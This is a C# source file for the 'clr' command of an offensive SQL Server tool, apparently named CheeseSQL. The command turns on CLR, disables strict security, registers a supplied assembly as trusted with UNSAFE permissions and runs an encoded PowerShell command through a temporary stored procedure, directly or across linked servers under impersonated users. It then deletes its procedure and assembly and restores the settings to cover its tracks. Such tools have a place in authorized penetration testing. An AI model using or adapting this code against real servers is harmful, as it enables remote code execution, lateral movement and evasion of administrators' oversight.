using CheeseSQL.Helpers;
using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.IO;

namespace CheeseSQL.Commands
{
    public class clr : ICommand
    {
        public static string CommandName => "clr";

        public string Description()
        {
            return $"[*] {CommandName}\r\n" +
                   $"  Description: Execute Encoded PowerShell Command on directly accessible or Linked SQL Server via custom .NET assemblies";
        }

        public string Usage()
        {
            return $"{Description()}\r\n  " +
                $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} " +
                $"/db:DATABASE " +
                $"/server:SERVER " +
                $"/target:TARGET " +
                $"/command:COMMAND " +
                $"/assembly:DLL " +
                $"/class:CLASS " +
                $"/method:METHOD " +
                $"[/compile] " +
                $"[/impersonate:USER] " +
                $"[/impersonate-linked:USER] " +
                $"[/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
        }

        public void Execute(Dictionary<string, string> arguments)
        {
            string connectInfo = "";
            string database = "";
            string connectserver = "";
            string target = "";
            string assembly = "";
            string clazz = "";
            string cmd = "";
            string method = "";
            string impersonate = "";
            string intermediate = "";
            string impersonate_intermediate = "";
            string impersonate_linked = "";

            bool compile = arguments.ContainsKey("/command");

            bool sqlauth = arguments.ContainsKey("/sqlauth");

            arguments.TryGetValue("/impersonate", out impersonate);
            arguments.TryGetValue("/intermediate", out intermediate);
            arguments.TryGetValue("/impersonate-intermediate", out impersonate_intermediate);
            arguments.TryGetValue("/impersonate-linked", out impersonate_linked);
            arguments.TryGetValue("/assembly", out assembly);
            arguments.TryGetValue("/class", out clazz);
            arguments.TryGetValue("/method", out method);

            if (!arguments.TryGetValue("/db", out database))
            {
                Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                return;
            }
            if (!arguments.TryGetValue("/server", out connectserver))
            {
                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                return;
            }
            if (!arguments.TryGetValue("/target", out target))
            {
                Console.WriteLine("\r\n[X] You must supply a target server!\r\n");
                return;
            }
            if (!arguments.TryGetValue("/command", out cmd))
            {
                Console.WriteLine("\r\n[X] You must supply a command to execute!\r\n");
                return;
            }

            if (String.IsNullOrEmpty(assembly) && !compile)
            {
                Console.WriteLine("\r\n[X] You must supply an assembly name, path, url, or choose the `compile` option\r\n");
                return;
            }
            else if (String.IsNullOrEmpty(assembly) && compile)
            {
                assembly = Path.GetFileNameWithoutExtension(Path.GetTempFileName());
            }
            if (String.IsNullOrEmpty(cmd))
            {
                Console.WriteLine("\r\n[X] You must supply a command to execute (PS Base64 Encoded)!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(clazz))
            {
                clazz = "StoredProcedures";
            }
            if (String.IsNullOrEmpty(method))
            {
                method = StringUtils.RandomString(10);
            }


            SqlConnection connection;
            SQLExecutor.ConnectionInfo(arguments, connectserver, database, sqlauth, out connectInfo);
            if (String.IsNullOrEmpty(connectInfo))
            {
                return;
            }
            if (!SQLExecutor.Authenticate(connectInfo, out connection))
            {
                return;
            }

            Console.WriteLine("[*] Loading assembly..");

            string hash;
            string hexData = AssemblyLoader.LoadAssembly(assembly, out hash, clazz, method, compile);


            var procedures = new Dictionary<string, string>();

            procedures.Add("Enabling advanced options..", $"sp_configure 'show advanced options', 1; RECONFIGURE;");
            procedures.Add("Enabling 'clr enabled'..", $"sp_configure 'clr enabled', 1; RECONFIGURE;");
            procedures.Add("Enabling 'clr strict security'..", $"sp_configure 'clr strict security', 0; RECONFIGURE;");
            procedures.Add("Adding assembly to trusted list..", $"sp_add_trusted_assembly @hash={hash};");
            procedures.Add($"Creating assembly [{assembly}]..", $"CREATE ASSEMBLY [{assembly}] FROM {hexData} WITH PERMISSION_SET = UNSAFE;");
            procedures.Add($"Creating procedure [{assembly}].[{clazz}].[{method}]..", $"CREATE PROCEDURE [dbo].[{method}] @command NVARCHAR (4000) AS EXTERNAL NAME [{assembly}].[{clazz}].[{method}];");

            procedures.Add("Executing command..", $"{method} '{cmd}';");

            procedures.Add("Dropping procedure..", $"DROP PROCEDURE [dbo].[{method}];");
            procedures.Add("Dropping assembly..", $"DROP ASSEMBLY [{assembly}];");
            procedures.Add("Removing assembly from trusted list..", $"sp_drop_trusted_assembly @hash={hash};");
            procedures.Add("Restoring CLR strict security'..", $"sp_configure 'clr strict security', 1; RECONFIGURE;");
            procedures.Add("Disabling CLR..", $"sp_configure 'clr enabled', 0; RECONFIGURE;");

            foreach (string step in procedures.Keys)
            {
                Console.WriteLine("[*] {0}", step);

                if (String.IsNullOrEmpty(target) && String.IsNullOrEmpty(intermediate))
                {
                    SQLExecutor.ExecuteProcedure(connection, procedures[step]);
                }
                else if (String.IsNullOrEmpty(intermediate))
                {
                    SQLExecutor.ExecuteLinkedProcedure(connection, procedures[step], target, impersonate, impersonate_linked);
                }
                else
                {
                    SQLExecutor.ExecuteDoubleLinkedProcedure(connection, procedures[step], target, intermediate, impersonate, impersonate_linked, impersonate_intermediate);
                }
            }

            connection.Close();
        }
    }
}
